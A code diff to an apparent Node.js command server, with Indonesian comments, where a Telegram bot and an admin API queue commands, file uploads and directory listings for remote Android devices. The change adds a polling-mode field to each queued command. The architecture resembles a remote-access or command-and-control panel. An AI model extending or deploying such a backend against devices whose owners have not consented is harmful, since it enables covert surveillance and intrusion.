@@ -464,8 +464,10 @@ Format Eksekusi Manual:
         const chatId = ctx.callbackQuery.message.chat.id.toString();
         const messageId = ctx.callbackQuery.message.message_id.toString();
 
-        await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id, message_id) VALUES (?, ?, ?, ?, ?, ?, ?)',
-            [cmdId, devId, realCmdName, cmdText, 'pending', chatId, messageId]);
+        const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [devId]);
+        const currentMode = device?.polling_mode || 'normal';
+        await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id, message_id, polling_mode) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
+            [cmdId, devId, realCmdName, cmdText, 'pending', chatId, messageId, currentMode]);
 
         // Beritahu client jika sedang menunggu long-polling
         notifyClient(devId, { id: cmdId, command: realCmdName, text: cmdText });
@@ -509,8 +511,10 @@ Format Eksekusi Manual:
             const cmdId = uuidv4().slice(0, 8);
             const sentMsg = await ctx.reply(`⏳ <b>[${command}]</b> dikirim ke <code>${devId}</code> dengan input: <i>${escapeHTML(ctx.message.text)}</i>\n<i>Menunggu Respon...</i>`, { parse_mode: 'HTML' });
 
-            await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id, message_id) VALUES (?, ?, ?, ?, ?, ?, ?)',
-                [cmdId, devId, command, ctx.message.text, 'pending', chatId.toString(), sentMsg.message_id.toString()]);
+            const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [devId]);
+            const currentMode = device?.polling_mode || 'normal';
+            await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id, message_id, polling_mode) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
+                [cmdId, devId, command, ctx.message.text, 'pending', chatId.toString(), sentMsg.message_id.toString(), currentMode]);
 
             notifyClient(devId, { id: cmdId, command: command, text: ctx.message.text });
             return;
@@ -543,8 +547,10 @@ Format Eksekusi Manual:
             const cmdId = uuidv4().slice(0, 8);
             const chatId = ctx.message.chat.id.toString();
 
-            await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id) VALUES (?, ?, ?, ?, ?, ?)',
-                [cmdId, devId, 'upload', uploadPayload, 'pending', chatId]);
+            const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [devId]);
+            const currentMode = device?.polling_mode || 'normal';
+            await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id, polling_mode) VALUES (?, ?, ?, ?, ?, ?, ?)',
+                [cmdId, devId, 'upload', uploadPayload, 'pending', chatId, currentMode]);
 
             ctx.reply(`📤 <b>Mengunggah File!</b>\nNama: <code>${fileName}</code>\nTujuan: <code>${destPath}</code>\nKe Perangkat: <code>${devId}</code>`, { parse_mode: 'HTML' });
         } catch (error) {
@@ -761,8 +767,10 @@ app.post('/response', async (req, res) => {
                     // Auto Refresh ls
                     const currentPath = devicePaths[client_id] || '/storage/emulated/0';
                     const refreshCmdId = uuidv4().slice(0, 8);
-                    await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id) VALUES (?, ?, ?, ?, ?, ?)',
-                        [refreshCmdId, client_id, 'ls', currentPath, 'pending', cmd.chat_id]);
+                    const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [client_id]);
+                    const currentMode = device?.polling_mode || 'normal';
+                    await db.run('INSERT INTO commands (id, device_id, command, text, status, chat_id, polling_mode) VALUES (?, ?, ?, ?, ?, ?, ?)',
+                        [refreshCmdId, client_id, 'ls', currentPath, 'pending', cmd.chat_id, currentMode]);
                     return res.json({ status: 'received' });
                 }
 
@@ -1090,8 +1098,10 @@ app.post('/admin/api/command', async (req, res) => {
 
         const { device_id, command, text } = req.body;
         const cmdId = uuidv4().slice(0, 8);
-        await db.run('INSERT INTO commands (id, device_id, command, text, status) VALUES (?, ?, ?, ?, ?)',
-            [cmdId, device_id, command, text || '', 'pending']);
+        const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [device_id]);
+        const currentMode = device?.polling_mode || 'normal';
+        await db.run('INSERT INTO commands (id, device_id, command, text, status, polling_mode) VALUES (?, ?, ?, ?, ?, ?)',
+            [cmdId, device_id, command, text || '', 'pending', currentMode]);
         res.json({ status: 'success', command_id: cmdId });
     } catch (e) {
         res.status(500).json({ error: 'Internal Server Error', details: e.message });
